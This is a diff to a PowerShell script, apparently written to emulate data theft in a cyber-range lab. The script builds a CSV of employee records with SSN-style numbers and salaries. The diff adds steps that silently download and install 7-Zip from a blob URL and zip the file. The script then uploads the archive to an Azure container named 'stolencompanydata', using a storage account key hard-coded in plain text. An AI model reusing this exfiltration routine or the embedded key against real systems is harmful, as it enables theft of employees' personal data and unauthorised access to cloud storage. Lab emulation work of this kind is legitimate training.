@@ -2,8 +2,9 @@
 $currentDateTime = Get-Date -Format "yyyyMMddHHmmss"
 $filePath = "C:\ProgramData\employee-data-$($currentDateTime).csv"
 $tempFilePath = "C:\ProgramData\employee-data-temp$($currentDateTime).csv"
+$zipFilePath = "C:\ProgramData\employee-data-$($currentDateTime).zip"  # Path for the zip file
 
-# Check if the file exists and delete it
+# Check if the CSV file exists and delete it
 if (Test-Path $filePath) {
     Remove-Item $filePath
     Write-Host "File deleted: $filePath"
@@ -48,25 +49,34 @@ Donald,Ramirez,151-11-4511,+1-950-537-3618x583,56339.03,1975-03-07
 # Write the employee data to the temporary CSV file
 $employeeData | Out-File -FilePath $tempFilePath -Encoding UTF8
 
-# Rename the temporary file to the original file name
-Rename-Item -Path $tempFilePath -NewName $filePath
-Write-Host "File created and renamed to: $filePath"
+# Download 7zip
+Invoke-WebRequest -Uri 'https://sacyberrange00.blob.core.windows.net/vm-applications/7z2408-x64.exe' -OutFile 'C:\programdata\7z2408-x64.exe'
+
+# Install 7zip silently
+Start-Process 'C:\programdata\7z2408-x64.exe' -ArgumentList '/S' -Wait
+
+Start-Sleep -Seconds 5
+
+# Use 7zip to zip the temporary CSV file
+& "C:\Program Files\7-Zip\7z.exe" a $zipFilePath $tempFilePath
+
+Write-Host "File zipped to: $zipFilePath"
 
 # Define Azure Blob Storage variables
-$storageUrl = "https://sacyberrangedanger.blob.core.windows.net/stolencompanydata/employee-data.csv"
+$storageUrl = "https://sacyberrangedanger.blob.core.windows.net/stolencompanydata/employee-data.zip"  # Change to the zip file
 $storageAccount = "sacyberrangedanger"
 $storageKey = "p5s3pxy+U3VRp3c64ueC8FI87M8+SOWkQzUUiI20steaoowL4P8Rc3wNPL8VNYOSH/w3JSdCS4+c+ASt3tqNng=="
-$blobType = "BlockBlob"  # You can change this to AppendBlob or PageBlob if needed
+$blobType = "BlockBlob"
 
 # Extract the container and blob name from the URL
 $containerName = "stolencompanydata"
-$blobName = "employee-data.csv"
+$blobName = "employee-data.zip"  # Change to the zip file
 
 # Define the date and headers
 $dateString = [DateTime]::UtcNow.ToString("R")
 $version = "2021-08-06"
 $contentType = "application/octet-stream"
-$fileContent = [System.IO.File]::ReadAllBytes($filePath)  # Read the file as a byte array
+$fileContent = [System.IO.File]::ReadAllBytes($zipFilePath)  # Read the zip file as a byte array
 $contentLength = $fileContent.Length
 
 # Construct the canonicalized resource and headers
@@ -93,5 +103,6 @@ $headers = @{
 }
 
 # Upload the blob using Invoke-WebRequest
-Invoke-WebRequest -Uri $storageUrl -Method Put -Headers $headers -InFile $filePath
+Invoke-WebRequest -Uri $storageUrl -Method Put -Headers $headers -InFile $zipFilePath
+
  
